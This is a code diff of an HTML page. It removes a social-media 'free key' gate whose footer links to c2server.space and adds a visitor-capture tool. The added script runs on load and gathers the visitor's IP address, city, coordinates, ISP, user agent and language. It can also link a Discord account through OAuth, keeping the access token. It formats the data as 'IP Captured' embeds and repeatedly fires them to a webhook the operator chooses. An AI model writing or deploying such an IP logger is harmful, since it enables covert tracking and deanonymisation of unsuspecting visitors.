+        <input type="text" id="extra-headers" placeholder='{"Authorization": "Bearer token"}' />
+      </div>
+
+      <div class="btn-group">
+        <button class="btn btn-primary" id="send-btn" onclick="sendWebhook()">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+          Fire Webhook
+        </button>
+        <button class="btn btn-secondary" onclick="autoSendToggle()" id="auto-btn">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg>
+          Auto-Send
+        </button>
+        <button class="btn btn-secondary" onclick="clearLog()">Clear Log</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Log ── -->
+  <div class="card">
+    <div class="card-label" style="justify-content:space-between; display:flex;">
+      <span>Request Log</span>
+      <span id="status-pill" class="status-pill pill-pending">Idle</span>
+    </div>
+    <div class="log-area" id="log-area">
+      <div class="log-entry"><span class="log-time">[--:--:--]</span><span class="log-info">Ready. Link Discord, configure webhook URL, then fire.</span></div>
+    </div>
+  </div>
+
+  <footer>All data processed client-side. Nothing is stored by this page.</footer>
+
 </div>
-
-<nav>
-  <span class="logo">CHEAP</span>
-  <span class="nav-tag">FREE KEY SYSTEM</span>
-</nav>
-
-<!-- HWID display bar -->
-<div class="hwid-bar">
-  <div class="dot"></div>
-  <span>Your Machine ID:</span>
-  <span class="hwid-val" id="hwidDisplay">Loading…</span>
-</div>
-
-<div class="card">
-
-  <div class="card-head">
-    <div class="hicon">🔑</div>
-    <h1>Get Your Free Key</h1>
-    <p>Complete all 3 tasks to unlock your personal key.<br/>Your key is locked to <em>this machine only</em>.</p>
-  </div>
-
-  <div class="prog-wrap">
-    <div class="prog-row"><span>Tasks</span><span id="progText">0 / 3</span></div>
-    <div class="prog-track"><div class="prog-fill" id="progFill" style="width:0%"></div></div>
-  </div>
-
-  <div class="tasks">
-
-    <!-- Discord -->
-    <div class="task" id="task-discord" onclick="openTask('discord')">
-      <div class="ticon discord">
-        <svg viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
-      </div>
-      <div class="tinfo">
-        <div class="tname">Join Discord Server</div>
-        <div class="tdesc">Join the community for updates and support</div>
-      </div>
-      <span class="tbadge" id="badge-discord">Join →</span>
-    </div>
-
-    <!-- YouTube -->
-    <div class="task locked" id="task-youtube" onclick="openTask('youtube')">
-      <div class="ticon youtube">
-        <svg viewBox="0 0 24 24" fill="white"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
-      </div>
-      <div class="tinfo">
-        <div class="tname">Subscribe on YouTube</div>
-        <div class="tdesc">Subscribe for tutorials and content drops</div>
-      </div>
-      <span class="tbadge" id="badge-youtube">Subscribe →</span>
-    </div>
-
-    <!-- TikTok -->
-    <div class="task locked" id="task-tiktok" onclick="openTask('tiktok')">
-      <div class="ticon tiktok">
-        <svg viewBox="0 0 24 24"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-2.88 2.5 2.89 2.89 0 0 1-2.89-2.89 2.89 2.89 0 0 1 2.89-2.89c.28 0 .54.04.79.1V9.01a6.33 6.33 0 0 0-.79-.05 6.34 6.34 0 0 0-6.34 6.34 6.34 6.34 0 0 0 6.34 6.34 6.34 6.34 0 0 0 6.33-6.34l-.01-8.65a8.2 8.2 0 0 0 4.79 1.53v-3.4a4.85 4.85 0 0 1-1.01-.09z" fill="#EE1D52"/><path d="M18.58 6.6a4.83 4.83 0 0 1-3.77-4.25V2h-3.44v13.67a2.89 2.89 0 0 1-2.89 2.5 2.89 2.89 0 0 1-2.88-2.89 2.89 2.89 0 0 1 2.88-2.89c.28 0 .55.04.8.1V9.01a6.33 6.33 0 0 0-.8-.05 6.34 6.34 0 0 0-6.33 6.34 6.34 6.34 0 0 0 6.33 6.34 6.34 6.34 0 0 0 6.34-6.34l-.01-8.65a8.2 8.2 0 0 0 4.79 1.53v-3.4a4.85 4.85 0 0 1-1.02-.18z" fill="#69C9D0"/></svg>
-      </div>
-      <div class="tinfo">
-        <div class="tname">Follow on TikTok</div>
-        <div class="tdesc">Follow for free giveaways and clips</div>
-      </div>
-      <span class="tbadge" id="badge-tiktok">Follow →</span>
-    </div>
-
-  </div>
-
-  <div class="lock-msg" id="lockMsg">Complete <span id="remainCount">3</span> more task(s) to unlock your key.</div>
-
-  <div class="key-section" id="keySection">
-    <div class="key-label">🎉 Your HWID-Locked Key</div>
-    <div class="key-box">
-      <div class="key-val" id="keyVal">CHEAP-XXXX-XXXX-XXXX-XXXX</div>
-      <button class="copy-btn" id="copyBtn" onclick="copyKey()">Copy</button>
-    </div>
-    <div class="key-note">
-      ⚠️ This key is <strong style="color:var(--red)">locked to your machine</strong> — it will not work on any other device.<br/>
-      Keys reset every 24 hours. Return here to generate a new one.
-    </div>
-  </div>
-
-</div>
-
-<footer>
-  <p>© 2025 Cheap · <a href="https://c2server.space">c2server.space</a></p>
-</footer>
 
 <script>
-  // ── CONFIG — update these URLs ─────────────────────────────────────────────
-  const TASK_CFG = {
-    discord: {
-      url:   'https://discord.gg/YOURINVITE',            // <-- your Discord invite
-      name:  'Join Discord Server',
-      sub:   'Click the button below — a new tab will open. Join the server, then come back.',
-      step:  '<strong>1.</strong> Click <strong>"Open Discord"</strong> below.<br><strong>2.</strong> Join the server in the new tab.<br><strong>3.</strong> Wait for the timer, then click <strong>"I\'ve Completed This"</strong>.',
-      cls:   'discord',
-    },
-    youtube: {
-      url:   'https://youtube.com/@YOURCHANNEL',         // <-- your YouTube channel
-      name:  'Subscribe on YouTube',
-      sub:   'Open the channel and hit Subscribe, then return here.',
-      step:  '<strong>1.</strong> Click <strong>"Open YouTube"</strong> below.<br><strong>2.</strong> Subscribe to the channel.<br><strong>3.</strong> Wait for the timer, then click <strong>"I\'ve Completed This"</strong>.',
-      cls:   'youtube',
-    },
-    tiktok: {
-      url:   'https://tiktok.com/@YOURPROFILE',          // <-- your TikTok profile
-      name:  'Follow on TikTok',
-      sub:   'Open the profile and tap Follow, then return here.',
-      step:  '<strong>1.</strong> Click <strong>"Open TikTok"</strong> below.<br><strong>2.</strong> Follow the profile.<br><strong>3.</strong> Wait for the timer, then click <strong>"I\'ve Completed This"</strong>.',
-      cls:   'tiktok',
-    },
-  };
+  /* ─────────────────────────────────────────────────────────────────────────
+     State
+  ───────────────────────────────────────────────────────────────────────── */
+  let capturedData   = {};
+  let discordUser    = null;   // { id, username, discriminator, avatar, token }
+  let autoSendActive = false;
+  let autoSendTimer  = null;
 
-  const TASK_ORDER   = ['discord', 'youtube', 'tiktok'];
-  const TIMER_SEC    = 5;   // seconds user must wait per task
-  const CIRCUMF      = 2 * Math.PI * 31; // svg circle circumference
+  const $ = id => document.getElementById(id);
 
-  // ── HWID ───────────────────────────────────────────────────────────────────
-  const params = new URLSearchParams(window.location.search);
-  const HWID   = params.get('hwid') || 'UNKNOWN';
-  document.getElementById('hwidDisplay').textContent = HWID;
+  /* ─────────────────────────────────────────────────────────────────────────
+     Visitor data
+  ───────────────────────────────────────────────────────────────────────── */
+  async function collectData() {
+    capturedData.ua        = navigator.userAgent;
+    capturedData.lang      = navigator.language || navigator.languages?.[0] || 'unknown';
+    capturedData.timestamp = new Date().toISOString();
+    $('m-ua').textContent   = capturedData.ua;
+    $('m-time').textContent = capturedData.timestamp;
+    $('m-lang').textContent = capturedData.lang;
 
-  // Hash function — MUST match AHK RollingHash4 exactly
-  function rollingHash4(str) {
-    let sum = 0;
-    for (let i = 0; i < str.length; i++)
-      sum = (sum * 31 + str.charCodeAt(i)) % 1679616;
-    return sum.toString(36).toUpperCase().padStart(4, '0');
+    try {
+      const res  = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+      capturedData.ip       = data.ip;
+      capturedData.country  = `${data.country_name} (${data.country_code})`;
+      capturedData.city     = data.city     || '—';
+      capturedData.region   = data.region   || '—';
+      capturedData.org      = data.org      || data.asn || '—';
+      capturedData.timezone = data.timezone || '—';
+      capturedData.lat      = data.latitude  ?? '—';
+      capturedData.lon      = data.longitude ?? '—';
+
+      $('ip-spinner').style.display = 'none';
+      $('ip-text').textContent      = capturedData.ip;
+      fillMeta();
+      removeSkeleton();
+      log('info', `IP resolved: ${capturedData.ip} — ${capturedData.country}`);
+    } catch (e) {
+      $('ip-text').textContent = 'Failed to resolve';
+      log('err', `Geo lookup failed: ${e.message}`);
+      removeSkeleton();
+    }
   }
 
-  function generateKey() {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    const rnd4 = () => Array.from({length:4}, () => chars[Math.floor(Math.random()*chars.length)]).join('');
-    const h    = rollingHash4(HWID);   // segment 1 = HWID hash
-    const s2   = rnd4();
-    const s3   = rnd4();
-    const chk  = rollingHash4(h + s2 + s3);
-    return `CHEAP-${h}-${s2}-${s3}-${chk}`;
+  function fillMeta() {
+    const set = (id, val) => { $(id).textContent = val; };
+    set('m-country', capturedData.country  || '—');
+    set('m-city',    capturedData.city     || '—');
+    set('m-region',  capturedData.region   || '—');
+    set('m-org',     capturedData.org      || '—');
+    set('m-tz',      capturedData.timezone || '—');
+    set('m-latlon',  `${capturedData.lat}, ${capturedData.lon}`);
   }
 
-  // ── STATE ──────────────────────────────────────────────────────────────────
-  const state    = { discord:'idle', youtube:'locked', tiktok:'locked' };
-  let completed  = 0;
-  let activeTask = null;
-  let timerInt   = null;
-  let timerLeft  = TIMER_SEC;
+  function removeSkeleton() {
+    document.querySelectorAll('.skeleton').forEach(el => el.classList.remove('skeleton'));
+  }
 
-  // ── MODAL ──────────────────────────────────────────────────────────────────
-  function openTask(id) {
-    if (state[id] !== 'idle') return;
-    const cfg = TASK_CFG[id];
-    activeTask = id;
+  /* ─────────────────────────────────────────────────────────────────────────
+     Discord OAuth2 — Implicit (token) flow
+  ───────────────────────────────────────────────────────────────────────── */
+  function discordLogin() {
+    const clientId = $('dc-client-id').value.trim();
+    if (!clientId) { log('err', 'Enter your Discord App Client ID first.'); return; }
 
-    // Populate modal
-    const micon = document.getElementById('micon');
-    micon.className = 'modal-icon ' + cfg.cls;
-    micon.innerHTML = document.querySelector(`.ticon.${cfg.cls}`).innerHTML;
-    document.getElementById('mtitle').textContent = cfg.name;
-    document.getElementById('msub').textContent   = cfg.sub;
-    document.getElementById('mstep').innerHTML    = cfg.step;
+    const redirectUri = encodeURIComponent(window.location.href.split('?')[0].split('#')[0]);
+    const scope       = encodeURIComponent('identify');
+    const state       = crypto.randomUUID();
+    sessionStorage.setItem('dc_state', state);
+    sessionStorage.setItem('dc_client_id', clientId);
 
-    // Reset timer UI
-    timerLeft = TIMER_SEC;
-    setTimerArc(TIMER_SEC);
-    document.getElementById('timerNum').textContent = TIMER_SEC;
-    const btn = document.getElementById('confirmBtn');
+    const url = `https://discord.com/oauth2/authorize`
+      + `?client_id=${clientId}`
+      + `&redirect_uri=${redirectUri}`
+      + `&response_type=token`
+      + `&scope=${scope}`
+      + `&state=${encodeURIComponent(state)}`;
+
+    window.location.href = url;
+  }
+
+  async function handleOAuthCallback() {
+    const hash = window.location.hash.slice(1);
+    if (!hash) return;
+
+    const params      = new URLSearchParams(hash);
+    const accessToken = params.get('access_token');
+    const returnState = params.get('state');
+    const savedState  = sessionStorage.getItem('dc_state');
+
+    // Clear fragment from URL without reload
+    history.replaceState(null, '', window.location.pathname + window.location.search);
+
+    if (!accessToken) return;
+    if (returnState && savedState && returnState !== savedState) {
+      log('err', 'OAuth state mismatch — possible CSRF. Aborting.');
+      return;
+    }
+
+    log('info', 'Discord token received. Fetching user data…');
+    try {
+      const res  = await fetch('https://discord.com/api/v10/users/@me', {
+        headers: { Authorization: `Bearer ${accessToken}` }
+      });
+
+      if (!res.ok) throw new Error(`Discord API ${res.status}`);
+      const u = await res.json();
+
+      discordUser = {
+        id:            u.id,
+        username:      u.username,
+        discriminator: u.discriminator && u.discriminator !== '0' ? `#${u.discriminator}` : '',
+        globalName:    u.global_name || u.username,
+        avatar:        u.avatar
+          ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.webp?size=128`
+          : `https://cdn.discordapp.com/embed/avatars/${parseInt(u.id) % 5}.png`,
+        token: accessToken
+      };
+
+      renderDiscordProfile();
+      log('ok', `Discord linked: ${discordUser.globalName} (${discordUser.id})`);
+    } catch (e) {
+      log('err', `Discord fetch failed: ${e.message}`);
+    }
+
+    sessionStorage.removeItem('dc_state');
+  }
+
+  function renderDiscordProfile() {
+    const u = discordUser;
+    $('dc-login-btn').disabled = true;
+    $('dc-client-id').disabled = true;
+
+    const display = u.globalName + (u.discriminator ? u.discriminator : '');
+    $('dc-username-display').textContent = display;
+    $('dc-id-display').textContent       = `ID: ${u.id}`;
+
+    const img = $('dc-avatar-img');
+    img.src = u.avatar;
+    img.style.display = 'block';
+    $('dc-avatar-ph').style.display = 'none';
+
+    $('dc-profile').style.display = 'flex';
+  }
+
+  function discordRevoke() {
+    discordUser = null;
+    $('dc-login-btn').disabled = false;
+    $('dc-client-id').disabled = false;
+    $('dc-profile').style.display = 'none';
+    $('dc-avatar-img').style.display = 'none';
+    $('dc-avatar-ph').style.display = 'flex';
+    log('info', 'Discord account unlinked.');
+  }
+
+  /* ─────────────────────────────────────────────────────────────────────────
+     Payload builders
+  ───────────────────────────────────────────────────────────────────────── */
+  function buildPayload(format) {
+    const d  = capturedData;
+    const dc = discordUser;
+
+    if (format === 'discord') {
+      const fields = [
+        { name: '🌐 IP Address', value: `\`${d.ip || '—'}\``,  inline: true },
+        { name: '🗺️ Country',    value: d.country || '—',      inline: true },
+        { name: '🏙️ City',       value: d.city    || '—',      inline: true },
+        { name: '📡 ISP / Org',  value: d.org     || '—',      inline: false },
+        { name: '⏱️ Timezone',   value: d.timezone || '—',     inline: true },
+        { name: '📍 Coords',     value: `${d.lat}, ${d.lon}`,  inline: true },
+        { name: '🌍 Language',   value: d.lang    || '—',      inline: true },
+        { name: '🖥️ User Agent', value: `\`${(d.ua || '').slice(0, 200)}\``, inline: false },
+      ];
+
+      if (dc) {
+        fields.unshift(
+          { name: '👤 Discord Username', value: `**${dc.globalName}${dc.discriminator}**`, inline: true },
+          { name: '🆔 Discord ID',       value: `\`${dc.id}\``,                            inline: true },
+        );
+      }
+
+      return {
+        embeds: [{
+          title: dc
+            ? `🎯 Captured — ${dc.globalName}${dc.discriminator}`
+            : '🎯 IP Captured',
+          color: 0x7c6af7,
+          thumbnail: dc ? { url: dc.avatar } : undefined,
+          fields,
+          footer: { text: `Captured at ${d.timestamp}` },
+          timestamp: d.timestamp
+        }]
+      };
+    }
+
+    if (format === 'slack') {
+      const dcSection = dc ? [{
+        type: 'section',
+        fields: [
+          { type: 'mrkdwn', text: `*Discord Username:*\n${dc.globalName}${dc.discriminator}` },
+          { type: 'mrkdwn', text: `*Discord ID:*\n\`${dc.id}\`` },
+        ]
+      }] : [];
+
+      return {
+        blocks: [
+          { type: 'header', text: { type: 'plain_text', text: dc ? `🎯 ${dc.globalName} Captured` : '🎯 IP Captured' } },
+          ...dcSection,
+          {
+            type: 'section',
+            fields: [
+              { type: 'mrkdwn', text: `*IP:*\n\`${d.ip || '—'}\`` },
+              { type: 'mrkdwn', text: `*Country:*\n${d.country || '—'}` },
+              { type: 'mrkdwn', text: `*City:*\n${d.city || '—'}` },
+              { type: 'mrkdwn', text: `*ISP:*\n${d.org || '—'}` },
+            ]
+          },
+          { type: 'section', text: { type: 'mrkdwn', text: `*User Agent:*\n\`${(d.ua || '').slice(0, 300)}\`` } },
+          { type: 'context', elements: [{ type: 'mrkdwn', text: `Timestamp: ${d.timestamp}` }] }
+        ]
+      };
+    }
+
+    if (format === 'custom') {
+      const tpl = $('custom-template').value.trim();
+      if (!tpl) { log('err', 'Custom template is empty.'); return null; }
+      const filled = tpl
+        .replace(/{{ip}}/g,          d.ip          || '')
+        .replace(/{{country}}/g,     d.country     || '')
+        .replace(/{{city}}/g,        d.city        || '')
+        .replace(/{{region}}/g,      d.region      || '')
+        .replace(/{{org}}/g,         d.org         || '')
+        .replace(/{{timezone}}/g,    d.timezone    || '')
+        .replace(/{{lat}}/g,         d.lat         || '')
+        .replace(/{{lon}}/g,         d.lon         || '')
+        .replace(/{{ua}}/g,          d.ua          || '')
+        .replace(/{{timestamp}}/g,   d.timestamp   || '')
+        .replace(/{{lang}}/g,        d.lang        || '')
+        .replace(/{{dc_username}}/g, dc ? `${dc.globalName}${dc.discriminator}` : '')
+        .replace(/{{dc_id}}/g,       dc ? dc.id    : '')
+        .replace(/{{dc_avatar}}/g,   dc ? dc.avatar: '');
+      try { return JSON.parse(filled); }
+      catch (e) { log('err', `Template parse error: ${e.message}`); return null; }
+    }
+
+    // Raw JSON
+    return {
+      ip: d.ip, country: d.country, city: d.city, region: d.region,
+      org: d.org, timezone: d.timezone, lat: d.lat, lon: d.lon,
+      ua: d.ua, lang: d.lang, timestamp: d.timestamp,
+      discord: dc ? {
+        username:      dc.globalName + dc.discriminator,
+        id:            dc.id,
+        avatar:        dc.avatar
+      } : null
+    };
+  }
+
+  /* ─────────────────────────────────────────────────────────────────────────
+     Fire webhook
+  ───────────────────────────────────────────────────────────────────────── */
+  async function sendWebhook() {
+    const url    = $('webhook-url').value.trim();
+    const method = $('method-select').value;
+    const format = $('format-select').value;
+
+    if (!url) { log('err', 'No webhook URL provided.'); return; }
+    if (!capturedData.ip) { log('err', 'IP not yet resolved. Wait a moment.'); return; }
+
+    const payload = buildPayload(format);
+    if (!payload) return;
+
+    let headers = { 'Content-Type': 'application/json' };
+    const extraRaw = $('extra-headers').value.trim();
+    if (extraRaw) {
+      try { Object.assign(headers, JSON.parse(extraRaw)); }
+      catch (e) { log('err', `Header parse error: ${e.message}`); return; }
+    }
+
+    const btn = $('send-btn');
     btn.disabled = true;
-    btn.className = 'modal-confirm';
-    btn.textContent = 'Waiting…';
+    setStatus('pending', 'Sending…');
+    const dcLabel = discordUser ? ` | Discord: ${discordUser.globalName}` : '';
+    log('info', `→ ${method} ${url}${dcLabel}`);
 
-    // Open overlay
-    document.getElementById('overlay').classList.add('open');
-
-    // Open the actual link in new tab
-    window.open(cfg.url, '_blank');
-
-    // Start countdown
-    clearInterval(timerInt);
-    timerInt = setInterval(() => {
-      timerLeft--;
-      document.getElementById('timerNum').textContent = timerLeft;
-      setTimerArc(timerLeft);
-      if (timerLeft <= 0) {
-        clearInterval(timerInt);
-        btn.disabled  = false;
-        btn.className = 'modal-confirm ready';
-        btn.textContent = "✔  I've Completed This";
-      }
-    }, 1000);
+    try {
+      await fetch(url, {
+        method,
+        headers,
+        body: JSON.stringify(payload),
+        mode: 'no-cors'
+      });
+      setStatus('ok', 'Sent');
+      log('ok', 'Webhook fired successfully.');
+    } catch (e) {
+      setStatus('err', 'Failed');
+      log('err', `Request failed: ${e.message}`);
+    } finally {
+      btn.disabled = false;
+    }
   }
 
-  function setTimerArc(sec) {
-    const offset = CIRCUMF * (1 - sec / TIMER_SEC);
-    document.getElementById('arc').style.strokeDashoffset = offset;
+  /* ─────────────────────────────────────────────────────────────────────────
+     Auto-send
+  ───────────────────────────────────────────────────────────────────────── */
+  function autoSendToggle() {
+    const btn = $('auto-btn');
+    if (!autoSendActive) {
+      autoSendActive = true;
+      btn.textContent = '⏹ Stop Auto';
+      btn.style.color = 'var(--red)';
+      sendWebhook();
+      autoSendTimer = setInterval(sendWebhook, 30000);
+      log('info', 'Auto-send on — fires every 30s.');
+    } else {
+      clearInterval(autoSendTimer);
+      autoSendActive = false;
+      btn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg> Auto-Send`;
+      btn.style.color = '';
+      log('info', 'Auto-send stopped.');
+    }
   }
 
-  function confirmTask() {
-    if (!activeTask || timerLeft > 0) return;
-    clearInterval(timerInt);
-    state[activeTask] = 'done';
-    completed++;
-
-    // Unlock next
-    const idx = TASK_ORDER.indexOf(activeTask);
-    if (idx + 1 < TASK_ORDER.length) state[TASK_ORDER[idx + 1]] = 'idle';
-
-    closeModal();
-    syncUI();
-
-    if (completed >= TASK_ORDER.length) revealKey();
+  /* ─────────────────────────────────────────────────────────────────────────
+     Helpers
+  ───────────────────────────────────────────────────────────────────────── */
+  function onFormatChange() {
+    const fmt = $('format-select').value;
+    const grp = $('custom-template-group');
+    grp.style.display = fmt === 'custom' ? 'flex' : 'none';
+    if (fmt === 'custom') grp.style.flexDirection = 'column';
   }
 
-  function closeModal() {
-    clearInterval(timerInt);
-    document.getElementById('overlay').classList.remove('open');
-    activeTask = null;
-  }
-
-  // ── KEY REVEAL ─────────────────────────────────────────────────────────────
-  function revealKey() {
-    const k = generateKey();
-    document.getElementById('keyVal').textContent = k;
-    document.getElementById('keySection').classList.add('show');
-    document.getElementById('lockMsg').style.display = 'none';
-  }
-
-  function copyKey() {
-    navigator.clipboard.writeText(document.getElementById('keyVal').textContent).then(() => {
-      const b = document.getElementById('copyBtn');
-      b.textContent = 'Copied!'; b.classList.add('ok');
-      setTimeout(() => { b.textContent = 'Copy'; b.classList.remove('ok'); }, 2000);
+  function copyIP() {
+    const ip = capturedData.ip;
+    if (!ip) return;
+    navigator.clipboard.writeText(ip).then(() => {
+      const btn = $('copy-btn');
+      btn.classList.add('copied');
+      btn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Copied`;
+      setTimeout(() => {
+        btn.classList.remove('copied');
+        btn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy`;
+      }, 2000);
     });
   }
 
-  // ── UI SYNC ────────────────────────────────────────────────────────────────
-  function syncUI() {
-    TASK_ORDER.forEach(id => {
-      const el  = document.getElementById('task-'+id);
-      const bdg = document.getElementById('badge-'+id);
-      el.classList.remove('done','locked','pending');
-      const s = state[id];
-      if (s === 'done')   { el.classList.add('done');   bdg.textContent = '✅ Done'; }
-      if (s === 'locked') { el.classList.add('locked');  bdg.textContent = '🔒 Locked'; }
-      if (s === 'idle')   {
-        switch(id) {
-          case 'discord': bdg.textContent = 'Join →'; break;
-          case 'youtube': bdg.textContent = 'Subscribe →'; break;
-          case 'tiktok':  bdg.textContent = 'Follow →'; break;
-        }
-      }
-    });
-    const pct = Math.round(completed / TASK_ORDER.length * 100);
-    document.getElementById('progFill').style.width = pct + '%';
-    document.getElementById('progText').textContent = `${completed} / ${TASK_ORDER.length}`;
-    document.getElementById('remainCount').textContent = TASK_ORDER.length - completed;
+  function log(type, msg) {
+    const area = $('log-area');
+    const now  = new Date().toTimeString().slice(0, 8);
+    const cls  = type === 'ok' ? 'log-ok' : type === 'err' ? 'log-err' : 'log-info';
+    const entry = document.createElement('div');
+    entry.className = 'log-entry';
+    entry.innerHTML = `<span class="log-time">[${now}]</span><span class="${cls}">${escHtml(msg)}</span>`;
+    area.appendChild(entry);
+    area.scrollTop = area.scrollHeight;
   }
 
-  syncUI();
+  function clearLog() { $('log-area').innerHTML = ''; log('info', 'Log cleared.'); }
+
+  function setStatus(type, text) {
+    const pill = $('status-pill');
+    pill.className = 'status-pill';
+    pill.classList.add(type === 'ok' ? 'pill-ok' : type === 'err' ? 'pill-err' : 'pill-pending');
+    pill.textContent = text;
+  }
+
+  function escHtml(s) {
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  /* ─────────────────────────────────────────────────────────────────────────
+     Boot
+  ───────────────────────────────────────────────────────────────────────── */
+  collectData();
+  handleOAuthCallback();   // picks up Discord token on redirect-back
+
+  // Restore saved client ID if present
+  const savedClientId = sessionStorage.getItem('dc_client_id');
+  if (savedClientId) $('dc-client-id').value = savedClientId;
 </script>
 </body>
 </html>
